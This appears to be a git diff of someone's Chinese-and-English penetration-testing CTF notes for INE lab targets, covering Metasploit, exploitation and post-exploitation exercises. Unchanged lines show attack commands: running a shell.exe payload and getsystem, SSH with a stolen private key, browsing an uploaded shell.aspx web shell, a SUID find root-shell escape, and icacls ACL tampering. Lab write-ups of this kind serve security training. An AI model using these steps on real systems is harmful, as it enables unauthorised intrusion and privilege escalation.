@@ -1,5 +1,5 @@
-Host & Network Penetration Testing: The Metasploit Framework CTF 1
-強調 Windows 環境中與錯誤配置的帳戶、暴露的目錄和不當的權限管理相關的風險
+# Host & Network Penetration Testing: The Metasploit Framework CTF 1
+	強調 Windows 環境中與錯誤配置的帳戶、暴露的目錄和不當的權限管理相關的風險
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target.ine.local
 	1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020.00; SP3
@@ -108,8 +108,7 @@ Host & Network Penetration Testing: The Metasploit Framework CTF 1
 	cmd: .\shell.exe
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	getsystem
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-Host & Network Penetration Testing: The Metasploit Framework CTF 2
+# Host & Network Penetration Testing: The Metasploit Framework CTF 2
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target1.ine.local 
 	873/tcp open  rsync   (protocol version 31)
@@ -172,7 +171,7 @@ Host & Network Penetration Testing: The Metasploit Framework CTF 2
 	機器私鑰來執行 SSH 命令
 	ssh -i id_rsa backupwscohen@target1.ine.local -p 873
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target2.ine.local 
 	80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -212,17 +211,16 @@ Host & Network Penetration Testing: The Metasploit Framework CTF 2
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	cd /etc/cron.d/
 	cat www-data-cron
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Host & Network Penetration Testing: Exploitation CTF 1 (linux)
-=> target1.ine.local and target2.ine.local
-1.vulnerable web application  (root directory) 
-2.不安全系統使用者
-3.易受攻擊的插件
-4.不需要身份驗證系統使用者
-
-/usr/share/nmap/nselib/data/wp-plugins.lst
-/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
-
+# Host & Network Penetration Testing: Exploitation CTF 1 (linux)
+	=> target1.ine.local and target2.ine.local
+	1.vulnerable web application  (root directory) 
+	2.不安全系統使用者
+	3.易受攻擊的插件
+	4.不需要身份驗證系統使用者
+	
+	/usr/share/nmap/nselib/data/wp-plugins.lst
+	/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+	
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target1.ine.local
 	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
@@ -306,8 +304,7 @@ Host & Network Penetration Testing: Exploitation CTF 1 (linux)
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ssh iamacrazyfreeuser@target2.ine.local
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Host & Network Penetration Testing: Exploitation CTF 2	(window)
+# Host & Network Penetration Testing: Exploitation CTF 2	(window)
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ifconfig (10.10.43.9) 
 	ping target.ine.local
@@ -402,8 +399,7 @@ Host & Network Penetration Testing: Exploitation CTF 2	(window)
 	exploit
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	瀏覽器 : http://10.0.29.223/shell.aspx
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Host & Network Penetration Testing: Exploitation CTF 3
+# Host & Network Penetration Testing: Exploitation CTF 3
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target1.ine.local 
 	21/tcp open  ftp     ProFTPD 1.3.5
@@ -485,8 +481,7 @@ Host & Network Penetration Testing: Exploitation CTF 3
 	/usr/bin/find
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	find . -exec /bin/sh -p \; -quit
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Host & Network Penetration Testing: Post-Exploitation CTF 1
+# Host & Network Penetration Testing: Post-Exploitation CTF 1
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	後利用(POST): 
 	=>透過升級權限、保持持久性和收集敏感資訊來最大化其存取的價值
@@ -557,8 +552,7 @@ Host & Network Penetration Testing: Post-Exploitation CTF 1
 	chmod +x linenum.sh
 	./LinEnum.sh
 	openssl passwd -6 password123
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Host & Network Penetration Testing: Post-Exploitation CTF 2
+# Host & Network Penetration Testing: Post-Exploitation CTF 2
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target.ine.local
 	22/tcp    open  ssh                OpenSSH for_Windows_9.5 (protocol 2.0)
@@ -619,8 +613,7 @@ Host & Network Penetration Testing: Post-Exploitation CTF 2
 	=> icacls用於修改檔案和目錄的存取控制清單 (ACL)
 	=> 刪除 SYSTEM 帳戶對位於 的資料夾的拒絕權限
 	icacls flag /remove:d "NT AUTHORITY\SYSTEM"
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Web Application Penetration Testing CTF 1
+# Web Application Penetration Testing CTF 1
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	=> 識別和利用 Web 應用程式中的漏洞以評估其安全狀況
 	=> 發現 SQL 注入、跨網站腳本 (XSS)、本機檔案包含 (LFI) 
